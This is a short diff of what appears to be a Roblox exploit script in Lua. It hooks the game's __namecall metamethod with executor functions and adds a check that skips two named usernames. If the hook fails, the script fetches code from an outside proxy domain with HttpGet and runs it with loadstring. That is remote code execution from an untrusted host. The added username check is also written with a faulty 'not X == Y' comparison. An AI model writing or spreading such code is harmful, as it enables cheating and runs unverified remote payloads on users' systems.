@@ -29,10 +29,11 @@ local function namecallHook(self, ...)
     return oldNamecall(self, ...)
 end
 local success, errorOrMessage
+if not _G.User == "didix357" and not game.Players.LocalPlayer.Name=="iTzGeradTamvan" then
 success, oldNamecall = pcall(hookmetamethod, game, "__namecall", newcclosure(namecallHook))
 if not success then
     loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("error")
-end
+end end
 
 
 if _G.dx then return end
